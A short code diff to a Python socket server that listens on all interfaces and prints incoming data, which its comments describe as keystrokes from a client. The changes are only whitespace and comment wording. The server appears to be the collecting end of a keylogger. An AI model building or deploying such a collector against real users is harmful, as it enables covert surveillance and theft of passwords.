@@ -2,7 +2,7 @@ import socket
 
 def start_server():
     host = '0.0.0.0'  # Listen on all interfaces
-    port = 5000        # Port for the server to listen on
+    port = 5000       # Port for the server to listen on
 
     # Create a socket object
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,7 +21,7 @@ def start_server():
         print(f"Connection established with {client_address}")
 
         try:
-            # Receive and print data (keystrokes) from the client
+            # Receive and print keystrokes from the client
             while True:
                 data = client_socket.recv(1024)  # Receive data from client
                 if not data:
